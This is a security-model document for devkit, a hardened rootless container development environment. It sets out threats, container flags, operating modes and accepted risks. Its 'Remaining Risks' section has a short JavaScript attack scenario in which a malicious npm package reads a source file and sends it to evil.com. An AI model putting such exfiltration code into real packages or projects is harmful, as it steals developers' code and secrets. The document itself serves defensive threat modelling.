# Devkit Security Model

This document describes the security architecture of devkit, including threats that are eliminated, mitigated, and those that remain as accepted risks.

## TL;DR - Security Summary

| Risk Category | Default Mode | Paranoid Mode | Notes |
|---------------|--------------|---------------|-------|
| Host filesystem access | **Eliminated** | **Eliminated** | No host mounts |
| Host localhost access | **Eliminated** | **Eliminated** | Loopback blocked |
| Privilege escalation | **Eliminated** | **Eliminated** | Caps dropped, no-new-privs |
| Malware persistence | **Eliminated** | **Eliminated** | Read-only rootfs |
| Remote network attacks | **Eliminated** | **Eliminated** | Localhost-only ports |
| Container escape (kernel) | Mitigated | Mitigated | Rootless reduces impact |
| Debug port RCE | Mitigated | **Eliminated** | Disabled in paranoid |
| Data exfiltration | **RISK** | **Eliminated** | Air-gapped after setup |
| Supply chain (pre-container) | **RISK** | **RISK** | User responsibility |

**Quick reference:**
```bash
devkit start              # Default: secure against most attacks
devkit start --paranoid   # Maximum: air-gapped, no exfiltration possible
devkit start --offline    # Immediate air-gap (no setup network)
```

---

## Threat Model

Devkit is designed to protect against:

1. **Supply-chain attacks** - Malicious code in npm packages, compromised dependencies
2. **0-day exploits** - Unknown vulnerabilities in project dependencies
3. **Malicious repositories** - Running untrusted code from third-party repos
4. **Data exfiltration** - Unauthorized access to host files, credentials, or services
5. **Lateral movement** - Using the dev environment as a pivot to attack other systems

The primary adversary is **malicious code executing inside the container** that attempts to compromise the host system or exfiltrate sensitive data.

---

## Security Modes

### Default Mode (`devkit start`)

```
┌─────────────────────────────────────────────────────────────────┐
│ HOST SYSTEM                                                     │
│                                                                 │
│  ~/.ssh, ~/.aws, ~/Documents  ──────────────── BLOCKED          │
│  localhost:5432 (postgres)    ──────────────── BLOCKED          │
│  localhost:6379 (redis)       ──────────────── BLOCKED          │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ CONTAINER (rootless, hardened)                            │  │
│  │                                                           │  │
│  │  • No host filesystem access                              │  │
│  │  • No localhost network access                            │  │
│  │  • All capabilities dropped                               │  │
│  │  • Read-only root filesystem                              │  │
│  │  • Privilege escalation blocked                           │  │
│  │                                                           │  │
│  │  Internet ◄─────────────────────────────── ALLOWED        │  │
│  │  (npm registry, github, etc.)                             │  │
│  │                                                           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  127.0.0.1:2222 (SSH) ◄──────────────────── VS Code connects   │
│  127.0.0.1:9229 (Debug) ◄────────────────── Debugger connects  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Protections enabled:**
- No host filesystem mounts (code cloned via git inside container)
- Host localhost blocked (`slirp4netns:allow_host_loopback=false`)
- All Linux capabilities dropped (`--cap-drop=ALL`)
- Privilege escalation prevented (`--security-opt=no-new-privileges`)
- Read-only root filesystem (`--read-only`)
- Resource limits (4GB RAM, 512 processes)
- Ports bound to 127.0.0.1 only

**Remaining risk:** Outbound internet allows data exfiltration.

---

### Paranoid Mode (`devkit start --paranoid`)

```
┌─────────────────────────────────────────────────────────────────┐
│ HOST SYSTEM                                                     │
│                                                                 │
│  PHASE 1: Setup (temporary)                                     │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ CONTAINER                                                 │  │
│  │  git clone ◄──────────────────────────── github.com       │  │
│  │  npm install ◄────────────────────────── registry.npmjs   │  │
│  └───────────────────────────────────────────────────────────┘  │
│                          │                                      │
│                          ▼ commit & recreate                    │
│                                                                 │
│  PHASE 2: Air-gapped (permanent)                                │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ CONTAINER (air-gapped)                                    │  │
│  │                                                           │  │
│  │  Internet ◄─────────────────────────────── BLOCKED        │  │
│  │  DNS       ◄─────────────────────────────── BLOCKED       │  │
│  │  Everything◄─────────────────────────────── BLOCKED       │  │
│  │                                                           │  │
│  │  Debug port 9229 ────────────────────────── DISABLED      │  │
│  │                                                           │  │
│  │  Dependencies pre-installed, code cloned                  │  │
│  │  Ready for development with ZERO network                  │  │
│  │                                                           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  127.0.0.1:2222 (SSH) ◄──────────────────── VS Code connects   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Two-phase startup:**

1. **Phase 1 - Setup** (network enabled):
   - Clone git repository
   - Install npm/yarn/pnpm dependencies
   - Container state committed (preserves installed deps)

2. **Phase 2 - Air-gapped** (network disabled):
   - Container recreated with `--network=none`
   - Debug port disabled
   - Stricter resource limits (2GB RAM, 256 PIDs)
   - **Zero network access** - no exfiltration possible

**Additional protections over default:**
- Complete network isolation after setup
- Debug port disabled (eliminates local RCE vector)
- Stricter resource limits
- DNS blocked (no DNS exfiltration)

---

### Offline Mode (`devkit start --offline`)

Starts immediately with `--network=none`. Use when:
- Dependencies are already cached/installed
- Working on previously cloned code
- You don't need any network access

---

## Eliminated Risks

These attack vectors are completely blocked by devkit's architecture.

### 1. Direct Host Filesystem Access

| Threat | Protection | Status |
|--------|------------|--------|
| Read host files (`~/.ssh`, `~/.aws`, etc.) | No host mounts by default | **Eliminated** |
| Write to host filesystem | Named volumes only, no host paths | **Eliminated** |
| Access host `/proc`, `/sys` | Not mounted, rootless namespace | **Eliminated** |
| Traverse to host via symlinks | No host mounts to traverse from | **Eliminated** |

**Implementation:**
```
--volume devkit-workspace:/home/developer/workspace:rw  # Named volume, not host path
--volume devkit-home:/home/developer:rw                 # Named volume, not host path
```

Code is cloned via `git clone` inside the container. The container has no knowledge of or access to host filesystem paths.

### 2. Access to Host Localhost Services

| Threat | Protection | Status |
|--------|------------|--------|
| Connect to host databases (PostgreSQL, MySQL, Redis) | Loopback blocked | **Eliminated** |
| Access host web services (localhost:3000, etc.) | Loopback blocked | **Eliminated** |
| Attack host Docker/Podman socket | Not mounted, loopback blocked | **Eliminated** |
| Connect to host SSH agent | Not forwarded, loopback blocked | **Eliminated** |

**Implementation:**
```
--network=slirp4netns:allow_host_loopback=false
```

The container's network namespace cannot route to the host's `127.0.0.1`. Attempts to connect to `localhost` or `127.0.0.1` from inside the container will fail.

### 3. Privilege Escalation via Setuid/Setgid

| Threat | Protection | Status |
|--------|------------|--------|
| Exploit setuid binaries | No-new-privileges flag | **Eliminated** |
| Setgid escalation | No-new-privileges flag | **Eliminated** |
| Capability acquisition | All capabilities dropped | **Eliminated** |

**Implementation:**
```
--security-opt=no-new-privileges:true
--cap-drop=ALL
```

Even if a setuid binary exists in the container, the kernel will ignore the setuid bit. The container starts with zero Linux capabilities and cannot acquire any.

### 4. Persistent Malware in Container

| Threat | Protection | Status |
|--------|------------|--------|
| Trojan installed in system directories | Read-only rootfs | **Eliminated** |
| Modified system binaries | Read-only rootfs | **Eliminated** |
| Cron jobs / systemd services | Read-only rootfs, no init | **Eliminated** |
| Bootkit / rootkit persistence | Read-only rootfs | **Eliminated** |

**Implementation:**
```
--read-only
--tmpfs=/tmp:rw,noexec,nosuid,size=512m
--tmpfs=/run:rw,noexec,nosuid,size=64m
```

The root filesystem is mounted read-only. Writable areas (`/tmp`, `/run`) are tmpfs with `noexec` and `nosuid` flags, preventing execution of dropped binaries.

### 5. External Network Access to Container Services

| Threat | Protection | Status |
|--------|------------|--------|
| Remote attacker connects to SSH | Bound to 127.0.0.1 only | **Eliminated** |
| Remote attacker connects to debug port | Bound to 127.0.0.1 only | **Eliminated** |
| Network scan discovers container | No external port exposure | **Eliminated** |

**Implementation:**
```
--publish 127.0.0.1:2222:22
--publish 127.0.0.1:9229:9229
```

Ports are bound exclusively to the loopback interface. Remote hosts cannot connect to container services, even if they have network access to the host machine.

### 6. Outbound Data Exfiltration (Paranoid Mode Only)

| Threat | Protection | Status |
|--------|------------|--------|
| Send source code to external server | `--network=none` | **Eliminated** (paranoid) |
| Exfiltrate environment variables | `--network=none` | **Eliminated** (paranoid) |
| DNS exfiltration tunnel | `--network=none` | **Eliminated** (paranoid) |
| C2 (command & control) communication | `--network=none` | **Eliminated** (paranoid) |

**Implementation (paranoid mode):**
```
--network=none
```

In paranoid mode, after initial setup, the container has **zero network access**. No TCP, UDP, ICMP, or DNS traffic can leave the container.

---

## Mitigated Risks

These attack vectors are significantly reduced but not completely eliminated.

### 1. Container Escape via Kernel Vulnerabilities

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Namespace escape | Rootless containers | User-level access if escaped |
| cgroups vulnerabilities | Rootless + limited capabilities | Reduced attack surface |
| runc/containerd bugs | Rootless, no-new-privileges | User-level access if escaped |

**Why it's mitigated, not eliminated:**

Container isolation depends on kernel features (namespaces, seccomp, cgroups). Historical CVEs include:

| CVE | Description | Devkit Impact |
|-----|-------------|---------------|
| CVE-2024-21626 | runc escape via fd leak | Mitigated by rootless |
| CVE-2022-0492 | cgroups v1 release_agent escape | Mitigated by rootless |
| CVE-2022-0185 | Heap overflow in fs context | Mitigated by dropped caps |
| CVE-2020-15257 | containerd-shim API exposure | Mitigated by rootless |

**Residual risk:** If a kernel-level escape occurs, the attacker gains access as the unprivileged user running Podman. They could then access:
- User's home directory files (`~/.ssh`, `~/.aws`, `~/.gnupg`)
- User's running processes
- User's network connections

**Additional mitigation:** Run devkit inside a VM for hardware-level isolation.

### 2. Resource Exhaustion (DoS)

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Fork bomb | `--pids-limit=512` (256 in paranoid) | Limited processes |
| Memory exhaustion | `--memory=4g` (2g in paranoid) | Limited memory |
| Disk exhaustion | Named volumes | Can fill volume (container-local) |
| CPU exhaustion | None by default | Can use 100% CPU |

**Implementation:**
```
--memory=4g
--pids-limit=512
```

**Residual risk:** A malicious process can still consume significant CPU and fill the container's workspace volume. This affects only the container and the user's system responsiveness, not system stability.

**Additional mitigation:** Add `--cpus=2` to limit CPU cores.

### 3. Information Disclosure via Debug Port

| Threat | Default Mode | Paranoid Mode |
|--------|--------------|---------------|
| Debug port RCE | Mitigated (localhost only) | **Eliminated** (disabled) |

**Default mode residual risk:** The Node.js debug protocol (port 9229) allows arbitrary code execution without authentication. Any process running as the same user on the host can connect to `127.0.0.1:9229` and execute code inside the container.

**Paranoid mode:** Debug port is completely disabled.

**Manual mitigation:** Use `--no-debug-port` flag.

### 4. SSH Server Attack Surface

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| OpenSSH vulnerabilities | Local-only, key-auth only | Local exploitation possible |
| Brute force attacks | Key authentication only | N/A (passwords disabled) |
| Credential theft | Public key only in container | Private key not exposed |

**Residual risk:** OpenSSH vulnerabilities are rare but do occur. A local attacker (or malware on the host) could potentially exploit the SSH server. Impact is limited to container access.

---

## Remaining Risks (Accepted)

These risks cannot be fully addressed by devkit and require user awareness or external controls.

### 1. Outbound Network Data Exfiltration (Default Mode Only)

> **Note:** This risk is **eliminated** in paranoid mode (`--paranoid`).

| Threat | Default Mode | Paranoid Mode |
|--------|--------------|---------------|
| Send source code to external server | **RISK** | Eliminated |
| Exfiltrate environment variables | **RISK** | Eliminated |
| DNS exfiltration tunnel | **RISK** | Eliminated |
| C2 communication | **RISK** | Eliminated |

**Why it's allowed in default mode:** The container needs network access to:
- Clone git repositories
- Install npm/yarn/pnpm packages
- Fetch remote resources during development

**Attack scenario:**
```javascript
// Malicious code in an npm package
const https = require('https');
const fs = require('fs');

// Steal source code
const code = fs.readFileSync('/home/developer/workspace/src/secret.js');
https.get(`https://evil.com/steal?data=${Buffer.from(code).toString('base64')}`);
```

**Mitigation:** Use `devkit start --paranoid` to air-gap after setup.

### 2. Supply Chain Attacks Before Container

| Threat | Status | Impact |
|--------|--------|--------|
| Compromised base image | **User responsibility** | Full container compromise |
| Malicious git repository | **User responsibility** | Code execution in container |
| npm registry compromise | **User responsibility** | Malicious package execution |
| Typosquatting packages | **User responsibility** | Malicious package execution |

**Why it's accepted:** Devkit cannot verify the legitimacy of:
- Docker/Podman base images
- Git repositories the user chooses to clone
- npm packages the project depends on

**Mitigation options:**

1. **Pin image digests:**
   ```yaml
   dependencies:
     runtime: node@sha256:abc123...  # Immutable reference
   ```

2. **Use verified publishers:**
   - Docker Official Images
   - Signed/verified npm packages

3. **Vendor dependencies:**
   - Commit `node_modules` to repository
   - Use offline mirror of npm registry

4. **Audit before running:**
   ```bash
   npm audit
   ```

### 3. Timing and Side-Channel Attacks

| Threat | Status | Impact |
|--------|--------|--------|
| Spectre/Meltdown | **Kernel dependent** | Cross-container data leak |
| Cache timing attacks | **Allowed** | Cryptographic key extraction |
| Resource timing | **Allowed** | Activity fingerprinting |

**Why it's accepted:** These attacks exploit CPU hardware vulnerabilities that cannot be mitigated purely in software. Container boundaries do not protect against speculative execution attacks.

**Mitigation options:**
- Keep kernel and microcode updated
- Use hardware with mitigations (newer CPUs)
- Run in VM with dedicated CPU cores

### 4. Local User Process Attacks

| Threat | Status | Impact |
|--------|--------|--------|
| Other user processes connect to container | **Allowed** | Via localhost-bound ports |
| Malware on host attacks container | **Allowed** | Via SSH or debug port |

**Why it's accepted:** Devkit protects the host from the container, not the container from the host. If the host is already compromised, the container provides no additional security.

**Mitigation options:**
- Ensure host system is secure
- Use multi-user isolation (different Unix user per project)
- Run in dedicated VM

---

## Security Configuration Reference

### CLI Flags

| Flag | Description | Network | Debug Port |
|------|-------------|---------|------------|
| (none) | Default secure mode | Restricted | Enabled |
| `--paranoid` | Maximum security, air-gap after setup | None (after setup) | Disabled |
| `--offline` | Start with no network immediately | None | Enabled |
| `--no-debug-port` | Disable debug port only | Restricted | Disabled |

### Configuration File

```yaml
# devkit.yaml - Security settings

security:
  # Network isolation level
  # - none: No network access (air-gapped, maximum security)
  # - restricted: Internet allowed, localhost blocked (default)
  # - full: Full network including localhost (dangerous)
  network_mode: restricted

  # Memory limit (prevents OOM attacks on host)
  # Paranoid mode uses 2g
  memory_limit: 4g

  # Maximum number of processes (prevents fork bombs)
  # Paranoid mode uses 256
  pids_limit: 512

  # Read-only root filesystem (prevents persistent malware)
  read_only_rootfs: true

  # Drop all Linux capabilities (minimizes kernel attack surface)
  drop_all_capabilities: true

  # Prevent privilege escalation via setuid binaries
  no_new_privileges: true

  # Disable debug port exposure (e.g., Node.js 9229)
  # Paranoid mode sets this to true
  disable_debug_port: false

features:
  # Allow mounting host directories (breaks filesystem isolation)
  # WARNING: Enables host filesystem access
  allow_mount: false

  # Allow copying files from host (limited exposure)
  allow_copy: false
```

---

## Comparison with Alternatives

| Feature | Devkit (default) | Devkit (paranoid) | Docker (default) | VM |
|---------|------------------|-------------------|------------------|-----|
| Host filesystem isolation | ✅ Full | ✅ Full | ❌ Often mounted | ✅ Full |
| Localhost network isolation | ✅ Blocked | ✅ Blocked | ❌ Accessible | ✅ Separate |
| Outbound network isolation | ❌ Allowed | ✅ Blocked | ❌ Allowed | Configurable |
| Privilege escalation prevention | ✅ Hardened | ✅ Hardened | ❌ Default caps | ✅ Separate kernel |
| Debug port exposure | ⚠️ Localhost | ✅ Disabled | ⚠️ Varies | N/A |
| Kernel-level isolation | ⚠️ Shared | ⚠️ Shared | ⚠️ Shared | ✅ Separate |
| Performance | ✅ Native | ✅ Native | ✅ Native | ⚠️ Overhead |
| Setup complexity | ✅ Simple | ✅ Simple | ⚠️ Manual hardening | ⚠️ Complex |

---

## Recommendations by Threat Level

### Standard Development (Trusted Code)
```bash
devkit start
```
- Your own code or well-known, audited dependencies
- Default hardening is sufficient
- Network access needed for ongoing development

### Reviewing Pull Requests / Third-Party Code
```bash
devkit start --paranoid
```
- Code from external contributors
- Dependencies you haven't fully audited
- Automatic air-gap prevents exfiltration

### Running Untrusted Code (Maximum Security)
```bash
# Inside a disposable VM:
devkit start --paranoid
# ... evaluate code ...
devkit stop --remove
```
- Malware samples, security research
- Completely untrusted repositories
- Use VM for hardware-level isolation
- Destroy everything after evaluation

### Quick Iteration (Previously Set Up)
```bash
devkit start --offline
```
- Dependencies already installed
- No network needed
- Maximum isolation from start

---

## Security Checklist

Before running untrusted code:

- [ ] Use `--paranoid` mode or at minimum `--offline`
- [ ] Review `devkit.yaml` for any dangerous overrides
- [ ] Ensure `allow_mount: false` and `allow_copy: false`
- [ ] Consider running inside a VM for kernel-level isolation
- [ ] Run `npm audit` on the codebase first
- [ ] Check for unusual postinstall scripts in package.json
- [ ] Have a plan to destroy the container after evaluation

---

## Reporting Security Issues

If you discover a security vulnerability in devkit, please report it responsibly:

1. **Do not** open a public GitHub issue
2. Email security concerns to the maintainers directly
3. Include steps to reproduce the vulnerability
4. Allow reasonable time for a fix before public disclosure

---

## Changelog

| Version | Security Changes |
|---------|------------------|
| 0.1.0 | Initial security model with hardened defaults |
| 0.2.0 | Added `--paranoid` mode with automatic air-gapping |
| 0.2.0 | Added `--offline` and `--no-debug-port` flags |
| 0.2.0 | Debug port disabled in paranoid mode |
